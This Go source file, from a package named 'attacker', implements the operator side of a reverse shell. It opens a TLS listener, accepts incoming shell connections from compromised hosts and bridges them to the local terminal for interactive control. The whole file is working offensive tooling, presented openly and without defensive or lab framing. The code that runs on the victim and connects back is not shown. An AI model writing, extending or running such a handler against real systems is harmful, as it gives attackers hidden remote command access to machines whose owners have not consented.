package attacker

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"os"
	"sync"
)

// ShellSession represents an active reverse shell connection.
type ShellSession struct {
	conn     net.Conn
	sourceIP string
	done     chan struct{}
	mu       sync.Mutex
}

// newShellListener creates a TLS listener for reverse shell connections on the given address.
func newShellListener(addr string, cert tls.Certificate) (net.Listener, error) {
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	listener, err := tls.Listen("tcp", addr, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to start shell listener on %s: %v", addr, err)
	}
	return listener, nil
}

// acceptShellConnection blocks until a connection arrives on the listener.
// Returns a ShellSession that can be bridged to the terminal.
func acceptShellConnection(listener net.Listener) (*ShellSession, error) {
	conn, err := listener.Accept()
	if err != nil {
		return nil, err
	}

	sourceIP := conn.RemoteAddr().String()

	return &ShellSession{
		conn:     conn,
		sourceIP: sourceIP,
		done:     make(chan struct{}),
	}, nil
}

// Bridge connects the shell session's I/O to stdin/stdout, blocking until
// the connection closes or EOF is received. Returns when the session ends.
func (s *ShellSession) Bridge() {
	s.mu.Lock()
	conn := s.conn
	s.mu.Unlock()

	if conn == nil {
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	// Remote -> local stdout
	go func() {
		defer wg.Done()
		io.Copy(os.Stdout, conn)
	}()

	// Local stdin -> remote
	go func() {
		defer wg.Done()
		io.Copy(conn, os.Stdin)
	}()

	wg.Wait()
	close(s.done)
}

// Close terminates the shell session.
func (s *ShellSession) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.conn != nil {
		s.conn.Close()
		s.conn = nil
	}
}

// SourceIP returns the remote address of the shell connection.
func (s *ShellSession) SourceIP() string {
	return s.sourceIP
}

// Done returns a channel that closes when the session ends.
func (s *ShellSession) Done() <-chan struct{} {
	return s.done
}
